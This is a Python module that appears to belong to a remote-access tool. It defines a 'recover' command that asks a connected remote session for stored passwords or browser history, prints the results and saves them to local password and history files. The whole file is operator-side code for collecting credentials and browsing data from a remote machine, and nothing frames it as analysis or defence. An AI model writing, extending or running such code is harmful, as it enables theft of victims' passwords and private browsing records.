from domestic.parse.error_exception_handling import *
from domestic.utility.validate_dict_key import *
from domestic.session.session_message import *
from domestic.utility.status_message import *
from domestic.make.make_history import *
from domestic.global_state import *


@error_exception_handling
def recover(message):
  password = validate_dict_key(message, 'password')
  history = validate_dict_key(message, 'history')
  quiet = validate_dict_key(message, 'quiet')
  force = validate_dict_key(message, 'force')

  if force is None:
    message['force'] = False

  if password:
    del message['password']
    message['action_type'] = 'password'

    if quiet:
      del message['quiet']

    data = session_message(message, False)

    if quiet is None:
      text = [x for x in data['message'].split('\n') if x != '']
      count = 0

      for line in text:
        if line[:3] == '[+]':
          print()
          status_message(line[4:], 'success', {'end': True, 'point': 'empty'})
        elif line[:3] == '[-]':
          print()
          status_message(line[4:], 'danger', {'end': True, 'point': 'empty'})
        elif line[:19] == '-------------------':
          if count != 0: print()
          count += 1
          status_message(line, 'raw')
        else:
          status_message(line, 'raw')
      print()
      
    make_file(['recover', 'recover/password'], 'txt', bytes(data['message'], 'utf-8'), 'Passwords succesfully recovered')
  elif history:
    del message['history']
    message['action_type'] = 'history'

    if quiet:
      del message['quiet']

    data = session_message(message, False)

    if quiet is None:
      for browser, browser_data in data['message'].items():
        browser = browser.capitalize()
        for link, title, date in browser_data:
          status_message(f'{browser}: {link}, {title}, {date}', 'pure', {'end': True})
      print()

    make_history(['recover', 'recover/history'], 'csv', data['message'], 'Browser history succesfully recovered')
  else:
    raise Exception('Error message')